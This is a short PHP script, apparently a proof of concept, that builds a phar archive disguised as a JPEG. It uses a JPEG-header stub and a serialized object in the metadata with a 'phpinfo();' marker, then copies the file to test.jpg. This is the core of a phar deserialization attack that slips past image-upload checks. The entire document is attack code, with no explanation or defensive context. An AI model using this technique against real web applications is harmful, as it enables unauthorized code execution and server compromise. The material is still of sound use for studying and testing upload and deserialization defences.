<?php 
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xFF\xD8\xFF\xFE\x13\xFA\x78\x74 __HALT_COMPILER(); ?>");

class AnyClass {}
$object = new AnyClass;
$object->data = 'phpinfo();';
$phar->setMetadata($object);
$phar->stopBuffering();

copy('test.phar', 'test.jpg');
